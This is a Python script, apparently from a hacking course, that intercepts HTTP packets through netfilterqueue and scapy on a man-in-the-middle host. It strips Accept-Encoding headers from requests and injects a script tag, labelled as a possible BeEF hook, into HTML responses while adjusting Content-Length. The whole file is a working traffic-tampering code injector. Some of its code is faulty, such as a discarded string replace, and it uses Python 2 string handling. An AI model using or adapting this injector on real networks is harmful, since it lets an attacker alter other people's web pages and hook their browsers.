#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Delete fields that need to be recalculated, let scapy fill them
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):

        load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load.replace("HTTP/1.1", "HTTP/1.0")  # replace HTTP newer version with a vulnerable one
            #  Regex: Accept-Encoding:.*?\\r\\n
            #  take "Accept-Encoding", ".*" any type & number of characters, "?\\r\\n" stop at first occurrence '\r\n'
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # Replace occurrence that change data format

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = "<script>alert('This could be a Beef Hook');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            #  Regex: (?:Content-Length:\s)(\d*)
            #  take "Content-Length", "\s" space, \d* any number characters, "(?:)" exclude, "()" include
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:  # Recalculate content length only if it's HTML page
                content_length = content_length_search.group(1)  # (0) = Content-Length:\s\d*, (1) = (\d*)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))  # maybe this could cause bugs
                print("[+] Replaced content length: " + content_length + " with: " + str(new_content_length))

        # Set packet if his load has been modified
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))  # Set the modified packet

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
